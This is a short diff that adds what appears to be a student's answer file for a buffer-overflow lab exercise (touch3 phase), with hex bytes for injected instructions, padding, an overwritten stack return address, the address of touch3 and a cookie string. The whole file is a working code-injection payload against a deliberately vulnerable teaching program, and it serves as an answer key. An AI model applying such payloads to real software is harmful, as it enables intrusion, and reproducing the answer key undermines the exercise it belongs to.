@@ -1,0 +1,6 @@
+48 c7 c7 c0 46 63 55 c3 /* 48 c7 c7 (rsp + 0x10) c3 */
+00 00 00 00 00 00 00 00 /* pad the remaining to fulfill buffer */
+00 00 00 00 00 00 00 00
+98 46 63 55 00 00 00 00 /* rsp - buffer */
+58 5b 55 55 55 55 00 00 /* address for touch3 */
+31 31 61 36 37 36 31 30 /* cookie value converted into ascii */
